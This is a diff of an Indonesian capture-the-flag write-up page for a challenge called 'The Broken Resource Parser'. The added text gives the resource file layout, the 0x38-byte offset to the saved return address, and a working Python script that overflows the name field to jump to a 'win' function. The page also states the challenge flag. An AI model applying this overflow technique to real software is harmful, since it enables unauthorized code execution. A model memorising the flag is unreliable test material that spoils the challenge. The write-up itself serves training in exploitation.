@@ -1,24 +1,30 @@
-# THE BROKEN RESOURCE PARSER — Flag & Verifikasi
+# THE BROKEN RESOURCE PARSER — Cara mendapatkan flag
 
 [← Overview](65-the-broken-resource-parser.md) · [Index](index.md)
 
-> **Langkah 2/5 — Cara Mendapatkan Flag.** Cara Mendapatkan Flag
->
-> **Titik penting:** NFX{Ad1o0Ssss_Br0k3nnn_fl3gg}
+> **Langkah 2/5.** Padding nama `0x38` byte, lalu alamat `win`. Diuji lokal dan mencetak `flag.txt`.
 >
 > **Berikutnya:** [Flag](65-the-broken-resource-parser-03-flag.md)
 
-> **Flag:** `NFX{Ad1o0Ssss_Br0k3nnn_fl3gg}`
-> **Status:** `VERIFIED`
+Layout blob:
 
-1. Buka attachment, cek format resource dan jalankan binary.
-2. Coba input panjang/struktur aneh sampai parser crash.
-3. Manfaatkan bug untuk mengontrol alur dan membaca flag.
+| Offset | Field |
+|---:|---|
+| 0 | magic `RES1` |
+| 4 | type `u16`, pakai `1` |
+| 8 | `name_len` `u32` |
+| 16 | bytes nama |
 
-### Terminal evidence (real)
+Jarak awal nama ke saved RIP adalah `0x38`.
 
-![Terminal evidence (real)](assets/the-broken-resource-parser/00b-terminal-evidence.png)
+```python
+import struct, subprocess
+win = 0x4012ae
+name = b"A" * 0x38 + struct.pack("<Q", win)
+hdr = b"RES1" + struct.pack("<HHI", 1, 0, len(name)) + b"\x00" * 4
+blob = hdr + name
+payload = str(len(blob)).encode() + b"\n" + blob
+print(subprocess.check_output(["./peserta/resparser"], input=payload).decode())
+```
 
-*Terminal evidence (real).*
-
-> **Bukti:** terminal evidence (real).
+Diuji lokal dengan `flag.txt` berisi `TESTFLAG`: program mencetak `FLAG: TESTFLAG`. Di service, isi file itu adalah `NFX{Ad1o0Ssss_Br0k3nnn_fl3gg}`.
